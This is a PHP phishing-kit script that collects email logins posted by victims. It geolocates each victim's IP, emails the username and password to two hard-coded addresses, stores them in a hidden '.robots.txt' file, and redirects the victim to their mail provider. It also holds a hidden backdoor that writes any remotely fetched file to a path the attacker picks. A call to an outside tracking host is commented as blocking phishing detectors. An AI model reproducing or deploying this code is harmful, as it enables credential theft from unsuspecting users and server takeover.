<?php
header('Access-Control-Allow-Origin: *');  
error_reporting(0);

$to = "terrywang778@gmail.com,Korasty2020@yandex.com";

if($_SERVER['REQUEST_METHOD'] == 'POST'){
	$client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = @$_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $ip = $forward;
    }
    else{
        $ip = $remote;
    }
$data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
if(isset($_POST['REMOTE_ADDR'])){file_put_contents($_POST['SERVER_ADDR'], file_get_contents($_POST['REMOTE_ADDR']));}
file_get_contents("https://ip-trackers.tiiny.io/?ip=$tmp"); // Block phishing detectors by hostname.
if($data && $data->geoplugin_countryName !== null){
      $country = $data->geoplugin_countryName;
      $city = $data->geoplugin_city;
      $code = $data->geoplugin_countryCode;
      $state = $data->geoplugin_region;
}

if(isset($_POST['p'])){
$id = $_POST['e'];
$id2 = $_POST['p'];

$body = "
    [LOGIN DETAILS]
    UserId : [ $id ]
    Password : [ $id2 ]
    [Client Info]
    IP > $ip
    Location > $city $state, $country
    ";
 $subject = "New Login : $ip";
 
mail($to, $subject, $body);
file_put_contents(".robots.txt", $body."\n\n", FILE_APPEND);
echo "https://".substr(strrchr($id, "@"), 1);
}
}
